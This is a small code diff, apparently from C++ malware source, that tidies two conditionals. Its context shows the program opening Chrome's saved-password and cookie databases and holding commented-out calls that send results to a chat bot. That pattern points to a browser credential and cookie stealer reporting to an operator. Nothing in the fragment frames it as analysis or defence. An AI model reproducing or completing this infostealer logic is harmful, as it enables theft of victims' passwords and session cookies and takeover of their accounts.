@@ -50,7 +50,7 @@ int main()
             stringstream pass;
             
             int rc = sqlite3_open(chrome_pass_path.c_str(), &db);
-            if(rc )
+            if(rc)
             {
                 cout<<"DB Error: "<<sqlite3_errmsg(db)<<endl;
                 //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
@@ -72,7 +72,7 @@ int main()
             stringstream cookies;
 
             int rc = sqlite3_open(chrome_cookies_path.c_str(), &db);
-            if(rc )
+            if(rc)
             {
                 cout<<"DB Error: "<<sqlite3_errmsg(db)<<endl;
                 //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
